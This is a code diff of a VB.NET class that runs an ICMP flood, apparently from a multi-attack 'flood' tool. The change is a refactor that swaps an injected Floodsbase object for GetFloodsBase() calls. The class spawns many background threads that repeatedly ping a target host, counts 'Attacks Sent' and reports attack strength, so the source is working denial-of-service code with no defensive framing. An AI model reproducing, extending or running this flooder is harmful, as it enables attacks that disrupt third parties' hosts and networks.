@@ -12,9 +12,7 @@ Public Class ICMP
     Private Threadsto As Integer
     Private Length As Integer
     Private Timeout As Integer
-    Private _Floodsbase As Floodsbase
-    Public Sub New(ByVal model As ICMPModel, ByVal Floodsbase As Floodsbase)
-        _Floodsbase = Floodsbase
+    Public Sub New(ByVal model As ICMPModel)
         If Not AttackRunning = True Then
             AttackRunning = True
             HostToAttack = model.Host
@@ -24,14 +22,14 @@ Public Class ICMP
             Length = model.Length
             Timeout = model.Timeout
             Threads = New Thread(Threadsto - 1) {}
-            _Floodsbase.SetMessage("ICMP Flood started!")
+            GetFloodsBase().SetMessage("ICMP Flood started!")
             For i As Integer = 0 To Threadsto - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
                 Threads(i).Start()
             Next
         Else
-            _Floodsbase.SetMessage("A ICMP Attack is Already Running on " & HostToAttack)
+            GetFloodsBase().SetMessage("A ICMP Attack is Already Running on " & HostToAttack)
         End If
     End Sub
 
@@ -41,7 +39,7 @@ Public Class ICMP
             _ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            _Floodsbase.SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
+            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         End If
@@ -56,11 +54,11 @@ Public Class ICMP
                 End Try
             Next
             AttackRunning = False
-            _Floodsbase.SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
+            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         Else
-            _Floodsbase.SetMessage("No Condis Attack is Running!")
+            GetFloodsBase().SetMessage("No Condis Attack is Running!")
         End If
     End Sub
 
@@ -80,8 +78,8 @@ Public Class ICMP
                     Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)
                     Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
                     Attacks = Attacks + 1
-                    _Floodsbase.Set_AttackUpStrengOnByte(Attacks * Length)
-                    _Floodsbase.Set_AttackDownStrengOnByte(Attacks * Length)
+                    GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * Length)
+                    GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * Length)
                     Continue Do
                 Catch
                     Continue Do
